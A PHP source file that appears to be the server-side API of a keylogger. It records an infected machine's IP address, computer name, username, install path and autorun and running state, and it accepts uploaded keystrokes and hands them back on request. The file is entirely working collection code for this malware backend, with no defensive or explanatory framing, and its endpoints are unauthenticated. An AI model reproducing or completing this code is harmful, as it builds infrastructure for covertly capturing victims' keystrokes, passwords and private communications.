<?php
    /**
     *  @author Samuel Finocchio <samuelfinocchioit@gmail.com>
     *  REST API
     */
    header ('Content-type: application/json');
    
    require_once('model/status.php');
    require_once('model/keystrokes.php');
    
    $result = json_encode(null, true);

    if(!isset($_GET['get']) && !isset($_POST['set']))
        die('No action specified');

    if($_SERVER['REQUEST_METHOD'] == 'GET')
        $get = $_GET['get'];

    if($_SERVER['REQUEST_METHOD'] == 'POST') {
        $set = $_POST['set'];
        $value = $_POST['value'];
    }

    if(isset($get))
    switch ($get)
    {
        // GET IP Address
        case 'ip_address':
            $result = json_encode (
                getAttribute('ip_address')
            );
        break;

        // GET Computer Name
        case 'computer_name':
            $result = json_encode (
                getAttribute('computer_name')
            );
        break;
    
        // GET Username
        case 'username':
            $result = json_encode (
                getAttribute('username')
            );
        break;

        // GET Installation Path
        case 'installation_path':
            $result = json_encode (
                getAttribute('installation_path')
            );
        break;

        // GET installed
        case 'installed':
            $result = json_encode (
                getAttribute('installed')
            );
        break;

        // GET autorun
        case 'autorun':
            $result = json_encode (
                getAttribute('autorun')
            );
        break;

        // GET running
        case 'running':
            $result = json_encode (
                getAttribute('running')
            );
        break;

        // GET keystrokes
        case 'keystrokes':
            $result = json_encode (
                getKeystrokes() // TODO
            );
        break;

        // GET error
        case 'error':
            $result = json_encode (
                getAttribute('error')
            );
        break;
    }
    
    if(isset($set))
    switch ($set)
    {
        // SET IP Address
        case 'ip_address':
            setAttribute('ip_address', $value);
        break;

        // SET Computer Name
        case 'computer_name':
            setAttribute('computer_name', $value);
        break;

        // SET Username
        case 'username':
            setAttribute('username', $value);
        break;
        
        // SET Installation Path
        case 'installation_path':
            setAttribute('installation_path', $value);
        break;

        // SET autorun
        case 'autorun':
            setAttribute('autorun', $value);
        break;

        // SET installed
        case 'installed':
            setAttribute('installed', $value);
        break;
    
        // SET running
        case 'running':
            setAttribute('running', $value);
        break;
    
        // SET reset
        case 'reset':
            reset($value); // TODO
        break;

        // SET keystrokes
        case 'keystrokes':
            appendKeystrokes($value); // TODO
        break;

        // SET error
        case 'error':
            setAttribute('error', $value);
        break;

    }

    // Sends response if any
    if(isset($result))
        echo $result;
?>